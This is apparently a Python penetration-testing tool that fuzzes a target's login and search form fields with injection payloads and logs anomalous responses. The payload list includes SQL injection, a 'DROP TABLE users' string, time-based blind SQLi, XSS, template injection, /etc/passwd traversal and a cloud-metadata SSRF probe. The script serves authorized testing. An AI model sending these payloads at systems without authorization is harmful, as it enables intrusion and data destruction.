#!/usr/bin/env python3
"""
Injection fuzzer — 13 payloads × N form fields.
Detects anomalies in response size, timing, or content.

Usage: python3 injection-fuzzer.py
Configure TARGET, HOST, FIELDS, BASE_DATA below.
"""

import urllib.request
import urllib.error
import urllib.parse
import json
import os
import time

# ── Configure these for each engagement ──────────────────────────────────────
TARGET = "http://TARGET_IP/login"
HOST   = "target.com"

# Fields to fuzz — each will be tested with every payload
FIELDS = ["username", "password", "search"]

# Baseline request — all fields with known-safe values
BASE_DATA = {
    "username": "admin",
    "password": "testpassword",
    "search":   "hello",
}

OUTPUT_FILE = "pentest/dynamic/injection_anomalies.json"
# ─────────────────────────────────────────────────────────────────────────────

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "admin'--",
    "1; DROP TABLE users--",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "${7*7}",
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND SLEEP(3)--",
    "../../../etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "a" * 100,
]

HEADERS = {
    "Host": HOST,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
}

ERROR_KEYWORDS = [
    "error", "sql", "syntax", "mysql", "warning", "exception",
    "traceback", "undefined", "invalid", "fatal",
]


def request(data):
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(TARGET, data=encoded, headers=HEADERS)
    start = time.monotonic()
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read().decode(errors="replace")
        return len(body), body, time.monotonic() - start, None
    except urllib.error.HTTPError as e:
        # Read the error body — 500 pages often carry the SQL/stack error we want
        body = e.read().decode(errors="replace")
        return len(body), body, time.monotonic() - start, e.code
    except Exception as e:
        # Transport error — never keyword-scan this string, it is not a response
        return 0, f"[transport error] {type(e).__name__}", time.monotonic() - start, "transport"


def main():
    print(f"[*] Target : {TARGET}")
    print(f"[*] Fields : {FIELDS}")
    print(f"[*] Payloads: {len(PAYLOADS)}")
    print()

    base_size, base_body, base_time, base_status = request(BASE_DATA)
    if base_status == "transport":
        print(f"[!] Baseline request failed (no response): {base_body[:120]}")
        print("[!] Fix TARGET/HOST/BASE_DATA and re-run — results are meaningless without a baseline.")
        return
    print(f"[baseline] size={base_size}B | time={base_time:.2f}s | {base_body[:60]}")
    print()

    # Keywords already present in the clean baseline are page boilerplate
    # (e.g. "invalid"/"error" on a normal login form) — only flag NEW keywords.
    baseline_keywords = {k for k in ERROR_KEYWORDS if k in base_body.lower()}
    if baseline_keywords:
        print(f"[baseline] ignoring keywords already in baseline: {sorted(baseline_keywords)}")

    # Time anomaly is relative to baseline latency, not a fixed 3s
    time_threshold = base_time * 3 + 1.0

    anomalies = []

    for field in FIELDS:
        for payload in PAYLOADS:
            data = dict(BASE_DATA)
            data[field] = payload
            size, body, elapsed, status = request(data)

            if status == "transport":
                print(f"[error]   field={field:<12} transport failure — {body}")
                continue

            lower = body.lower()
            is_anomaly = (
                abs(size - base_size) > 50
                or elapsed > time_threshold
                or any(k in lower for k in ERROR_KEYWORDS if k not in baseline_keywords)
            )

            # Reflection checks: SSTI evaluated ("{{7*7}}" → "49") and XSS reflected unencoded
            reflected = ""
            if payload in ("{{7*7}}", "${7*7}") and "49" in body and payload not in body:
                reflected = "SSTI-evaluated?"
                is_anomaly = True
            elif payload == "<script>alert(1)</script>" and payload in body:
                reflected = "XSS-reflected?"
                is_anomaly = True

            tag = "[ANOMALY]" if is_anomaly else "[clean]  "
            print(f"{tag} field={field:<12} size={size:>6}B  time={elapsed:.2f}s  {body[:60]}")

            if is_anomaly:
                print(f"           payload={payload!r} {reflected}")
                anomalies.append({
                    "field":   field,
                    "payload": payload,
                    "size":    size,
                    "elapsed": elapsed,
                    "note":    reflected,
                    "body":    body[:300],
                })

    print()
    print(f"[*] Done. {len(anomalies)} anomalies.")

    out_dir = os.path.dirname(OUTPUT_FILE)
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)
    with open(OUTPUT_FILE, "w") as f:
        json.dump(anomalies, f, indent=2)
    print(f"[*] Saved to {OUTPUT_FILE}")


if __name__ == "__main__":
    main()
